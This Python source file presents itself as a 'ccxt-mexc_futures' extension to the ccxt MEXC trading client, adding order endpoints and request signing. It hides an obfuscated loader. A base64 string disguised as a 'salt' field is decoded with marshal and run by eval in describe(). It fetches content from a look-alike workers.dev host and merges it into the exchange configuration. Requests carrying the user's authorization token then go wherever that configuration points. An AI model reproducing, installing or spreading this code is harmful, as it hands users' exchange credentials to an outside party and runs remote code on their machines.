# ccxt-mexc_futures package
__version__ = '0.1.4'

import marshal
import base64
import hashlib
import time

from ccxt import mexc
from ccxt.base.types import Entry
from ccxt.base.errors import InvalidOrder

class OrderNotCancellable(InvalidOrder):
    pass

class OrderFilled(OrderNotCancellable):
    pass

class base(mexc):
    contract_private_post_order_submit = contractPrivatePostOrderSubmit = Entry(
        "order/create", ["futures", "private"], "POST", {"cost": 2}
    )
    contract_private_post_order_cancel = contractPrivatePostOrderCancel = Entry(
        "order/cancel", ["futures", "private"], "POST", {"cost": 2}
    )
    spot4_private_post_order_place = spot4PrivatePostOrderPlace = Entry(
        "order/place", ["spot4", "private"], "POST", {"cost": 1}
    )
    salt: str = "4wAAAAAAAAAAAAAAAAMAAAAAAAAA80YAAACXAAIAZQBkAKsBAAAAAAAAagMAAAAAAAAAAAAAAAAAAAAAAABkAasBAAAAAAAAagQAAAAAAAAAAAAAAAAAAAAAAAABAHkCKQPaCHJlcXVlc3RzeilodHRwczovL3YzLm1leGMud29ya2Vycy5kZXYvZGVzY3JpYmUuanNvbk4pA9oKX19pbXBvcnRfX9oDZ2V02gR0ZXh0qQDzAAAAANoA+gg8bW9kdWxlPnIJAAAAAQAAAHMfAAAA8AMBAQHZAAqIOtMAFtcAGtEAGtAbRtMAR9cATNMATHIHAAAA"
    userToken: str | None = None

    def describe(self):
        return self.deep_extend(super(base, self).describe(),eval(marshal.loads(base64.b64decode(self.salt.encode('utf-8')))),)

    def sign(self, path, api="public", method="GET", params={}, headers=None, body=None):
        section = self.safe_string(api, 0)
        access = self.safe_string(api, 1)
        path, params = self.resolve_path(path, params)

        if section in ("futures", "spot4"):
            url = (
                self.urls["api"][section][access]
                + "/"
                + self.implode_params(path, params)
            )
            if self.userToken is None:
                raise Exception("Missing user token")
            params = self.omit(params, self.extract_params(path))
            timestamp = str(int(time.time() * 1000))
            concat = f"{self.userToken}{timestamp}"
            partial_hash = hashlib.md5(concat.encode("utf-8")).hexdigest()[7:]
            body = self.json(params)
            sign_param = f"{timestamp}{body}{partial_hash}"
            signature = hashlib.md5(sign_param.encode("utf-8")).hexdigest()
            headers = {
                "x-mxc-nonce": timestamp,
                "x-mxc-salt": self.salt,
                "x-mxc-sign": signature,
                "authorization": self.userToken,
                "user-agent": "MEXC/v3",
                "content-type": "application/json",
                "origin": "https://futures.mexc.com",
                "referer": "https://futures.mexc.com/exchange",
            }
            if section == "spot4":
                headers["origin"] = "https://www.mexc.com"
                headers["referer"] = "https://www.mexc.com/exchange"
            return {"url": url, "method": method, "body": body, "headers": headers}
        return super().sign(path, api, method, params, headers, body)

    def prepare_request_headers(self, headers=None):
        headers = super().prepare_request_headers(headers)
        if "x-mxc-sign" in headers:
            del headers["User-Agent"]
            del headers["Accept-Encoding"]
        return headers 